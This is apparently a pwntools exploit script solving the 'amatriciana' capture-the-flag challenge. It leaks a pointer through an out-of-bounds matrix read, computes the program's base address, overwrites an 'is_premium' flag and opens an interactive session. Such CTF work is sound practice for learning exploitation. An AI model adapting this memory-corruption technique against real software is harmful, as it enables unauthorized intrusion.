from pwn import *
from struct import *

exe = ELF("./amatriciana")

context.binary = exe

HOST = "amatriciana.challs.olicyber.it"
PORT = 12302

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def menu(r, choice):
    r.recvuntil(b"8) Esci\n")
    r.sendline(f"{choice}".encode())
    
def new(r, rows, cols, name):
    menu(r, 0)

    r.sendlineafter(b"colonne?", f"{rows} {cols}".encode())
    r.sendlineafter(b"a questa matrice?\n", name.encode())

    r.recvuntil(b"successo\n")
    r.recvuntil(b"nrows: ")

    return int(r.recvline(False).decode(), 16)

def read(r, addr, bigmat, bigrow):
    addr //= 8

    menu(r, 3)
    r.sendlineafter(b"matrice?", f"{bigmat}".encode())

    row = addr // bigrow
    col = addr % bigrow
    r.sendlineafter(b"elemento?\n", f"{row} {col}".encode())

    return r.recvline(False)

def write(r, addr, value, bigmat, bigrow):
    addr //= 8

    menu(r, 4)
    r.sendlineafter(b"matrice?", f"{bigmat}".encode())

    row = addr // bigrow
    col = addr % bigrow
    r.sendlineafter(b"elemento?", f"{row} {col}".encode())

    sending = unpack("<d", p64(value))[0]
    r.sendline(f"{sending:.20e}".encode())

def main():
    r = conn()

    addr = new(r, 1, 1, "palle123")
    log.info(f"LEAKED ADDR: {hex(addr)}")

    main_ = addr + 0x60

    bigrow = (1 << 30)
    bigmat = 1
    new(r, bigrow, bigrow, "mat1234")

    leak = read(r, main_, bigmat, bigrow)
    leak_addr = u64(pack("<d", float(leak)))

    exe.address = leak_addr - exe.sym.main
    log.success(f"LEAKED PIE BASE: {hex(exe.address)}")

    write(r, exe.sym.is_premium, 1, bigmat, bigrow)

    menu(r, 6)
    r.sendlineafter(b"matrici?\n", b"0 1")

    r.interactive()

if __name__ == "__main__":
    main()
